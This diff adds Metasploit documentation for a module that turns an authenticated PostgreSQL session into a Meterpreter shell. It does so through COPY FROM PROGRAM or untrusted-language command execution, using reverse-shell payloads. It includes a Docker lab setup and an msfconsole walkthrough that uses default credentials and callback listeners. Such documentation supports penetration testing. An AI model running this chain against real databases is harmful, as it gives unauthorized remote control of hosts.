@@ -1,0 +1,103 @@
+## Vulnerable Application
+
+This module upgrades an existing PostgreSQL session to Meterpreter by chaining
+existing PostgreSQL command execution modules into the standard shell upgrade
+flow. A PostgreSQL server that accepts authenticated logins and allows command
+execution via either:
+
+- `postgres_copy_from_program_cmd_exec` (COPY FROM PROGRAM), or
+- `postgres_createlang` (untrusted language creation)
+
+is required. For testing, a stock PostgreSQL Docker image is sufficient.
+
+Example lab setup:
+
+```
+docker rm -f pg 2>/dev/null || true
+docker run --rm --name pg -e POSTGRES_PASSWORD=postgres -p 5432:5432 postgres:14
+```
+
+## Verification Steps
+
+1. Start the PostgreSQL Docker container.
+1. Start `msfconsole`.
+1. Create a PostgreSQL session using `auxiliary/scanner/postgres/postgres_login`.
+1. Run `sessions -u <id>` to upgrade the PostgreSQL session to Meterpreter.
+1. You should receive a Meterpreter session.
+
+## Options
+
+### LHOST
+
+The callback IP used for the Meterpreter upgrade stage. If not set, the module
+attempts to resolve a suitable address.
+
+### LPORT
+
+The callback port used for the Meterpreter upgrade stage.
+
+### SHELL_LHOST
+
+The callback IP used by the initial shell stage created by the PostgreSQL
+command execution modules. Defaults to `LHOST` if not set.
+
+### SHELL_LPORT
+
+The callback port used by the initial shell stage.
+
+### SHELL_HANDLER
+
+Whether to start a handler for the initial shell stage. Set to `false` if you
+intend to run your own handler.
+
+### SHELL_PAYLOAD
+
+Payload to use for the initial shell stage. Defaults to `cmd/unix/reverse_perl`
+on Unix-like platforms and `cmd/windows/powershell_reverse_tcp` on Windows.
+
+### SHELL_WAIT
+
+How long (in seconds) to wait for the initial shell session to connect.
+
+### METHOD
+
+Which PostgreSQL command execution method to attempt:
+
+- `AUTO` (default): try `COPY`, then `CREATELANG`
+- `COPY`: use `postgres_copy_from_program_cmd_exec`
+- `CREATELANG`: use `postgres_createlang`
+
+## Scenarios
+
+### PostgreSQL 14 on Docker (macOS)
+
+```
+# Start container
+$ docker rm -f pg 2>/dev/null || true
+$ docker run --rm --name pg -e POSTGRES_PASSWORD=postgres -p 5432:5432 postgres:14
+
+# Find IPv4 callback for Docker Desktop
+$ docker exec -it pg bash -lc "getent ahostsv4 host.docker.internal | awk 'NR==1{print $1}'"
+192.168.65.254
+
+# In msfconsole
+msf > setg LHOST 192.168.65.254
+msf > setg SHELL_LHOST 192.168.65.254
+msf > setg LPORT 4433
+msf > setg SHELL_LPORT 4444
+msf > setg ReverseListenerBindAddress 0.0.0.0
+msf > setg SHELL_WAIT 60
+
+msf > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 127.0.0.1
+msf auxiliary(scanner/postgres/postgres_login) > set RPORT 5432
+msf auxiliary(scanner/postgres/postgres_login) > set USERNAME postgres
+msf auxiliary(scanner/postgres/postgres_login) > set PASSWORD postgres
+msf auxiliary(scanner/postgres/postgres_login) > set DATABASE postgres
+msf auxiliary(scanner/postgres/postgres_login) > set CreateSession true
+msf auxiliary(scanner/postgres/postgres_login) > run
+
+msf auxiliary(scanner/postgres/postgres_login) > sessions -l
+msf auxiliary(scanner/postgres/postgres_login) > sessions -u 1
+msf auxiliary(scanner/postgres/postgres_login) > sessions -l
+```
